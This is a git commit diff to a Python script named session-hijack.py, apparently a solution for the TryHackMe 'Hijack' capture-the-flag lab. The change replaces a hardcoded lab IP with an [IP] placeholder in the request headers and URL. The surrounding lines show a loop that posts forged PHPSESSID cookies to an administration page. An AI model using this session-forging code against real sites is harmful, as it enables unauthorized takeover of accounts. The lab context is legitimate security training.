dc0d7ef76c64eb328d09251a92f443676bfc85e5
mauzinho <mauzware@gmail.com>
2025-06-07 22:01:52 +0100

    session-hijack.py

--- Hijack-THM/session-hijack.py
+++ Hijack-THM/session-hijack.py
@@ -25,12 +25,12 @@ for password in passwords:
             'Accept-Language': 'en-US,en;q=0.5',
             'Accept-Encoding': 'gzip, deflate',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'http://10.10.106.87',
-            'Referer': 'http://10.10.106.87/administration.php',
+            'Origin': 'http://[IP]',
+            'Referer': 'http://[IP]/administration.php',
             'Cookie': 'PHPSESSID='+sessionid,
             'Upgrade-Insecure-Requests': '1'
     }
-    url = 'http://10.10.106.87/administration.php'
+    url = 'http://[IP]/administration.php'
 
     response = requests.post(url, headers=headers)
     text = response.text
